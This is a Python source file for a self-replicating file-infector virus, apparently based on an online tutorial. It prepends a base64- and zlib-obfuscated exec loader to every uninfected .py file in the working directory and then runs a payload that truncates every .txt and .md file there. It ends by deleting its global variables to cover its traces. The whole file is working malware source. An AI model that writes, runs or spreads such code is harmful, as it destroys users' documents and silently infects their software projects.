# 853631acd1567f8403c1c4cb2387b9fe
# Reference: https://thepythoncorner.com/posts/2021-08-30-how-to-create-virus-python/
# Criptografia
import os
import glob
import hashlib
import zlib
import base64
import random

def read_file_lines(file_path):
    data = None
    with open(file_path, "r") as file:
        data = file.readlines()
    return data

def obscure_virus_code(virus_code):
    compress_level = 9
    data_bytes = bytes("".join(virus_code), "utf-8")
    return base64.urlsafe_b64encode(zlib.compress(data_bytes, compress_level))

def transform_virus_code(virus_code):
  transformed_virus_code = []
  for line in virus_code:
    transformed_virus_code.append("# " + str(random.randrange(1000000)) + "\n")
    transformed_virus_code.append(line + "\n")
  return transformed_virus_code

def get_tags(file_path):
    file_name = os.path.basename(file_path)
    begin_hash_tag = hashlib.md5((file_name + "/begin").encode("utf-8")).hexdigest()
    end_hash_tag = hashlib.md5((file_name + "/end").encode("utf-8")).hexdigest()
    begin_tag = "# " + begin_hash_tag
    end_tag = "# " + end_hash_tag
    return [ begin_tag, end_tag ]

def read_virus_code():
    virus_code = []
    inside_virus_code = False
    [ begin_tag, end_tag ] = get_tags(__file__)
    
    lines = read_file_lines(__file__)
    for line in lines:
        if (begin_tag in line) and (not inside_virus_code):
            inside_virus_code = True
        elif end_tag in line:
            break
        else:
            virus_code.append(line)
    return virus_code

def find_files(pattern, root_dir):
    return glob.glob(pattern, root_dir=root_dir)

def infect(file_path, virus):
    file_infected = False
    [ begin_tag, end_tag ] = get_tags(file_path)

    data = read_file_lines(file_path)
    for line in data:
        if begin_tag in line:
            file_infected = True
            break

    if not file_infected:
        with open(file_path, "w") as clean_file:
            clean_file.write(begin_tag + "\n")
            transformed_virus_code = transform_virus_code(virus)
            obscured_virus_code = obscure_virus_code(transformed_virus_code)
            executable = "exec(\"import zlib\\nimport base64\\nexec(zlib.decompress(base64.urlsafe_b64decode(" + str(obscured_virus_code) + ")))\")" + "\n"
            clean_file.write(executable)
            clean_file.write(end_tag + "\n")
            clean_file.writelines(data)

def replicate():
    virus = read_virus_code()
    for file_path in find_files("*.py", "."):
        infect(file_path, virus)

def clear_file(file_path):
    try:
        with open(file_path, 'w') as file:
            file.truncate(0)
    except IOError:
        return

def execute_payload():
    txt_pattern = "*.txt"
    md_pattern = "*.md"
    txt_files = glob.glob(txt_pattern)
    md_files = glob.glob(md_pattern)
    file_paths = txt_files + md_files
    
    for file_path in file_paths:
        clear_file(file_path)

replicate()
execute_payload()
for global_variable_name in list(globals().keys()):
    if not global_variable_name.startswith("__"):
        exec("del {}".format(global_variable_name))
del global_variable_name
# 480b997274e48e483b495739717164b5
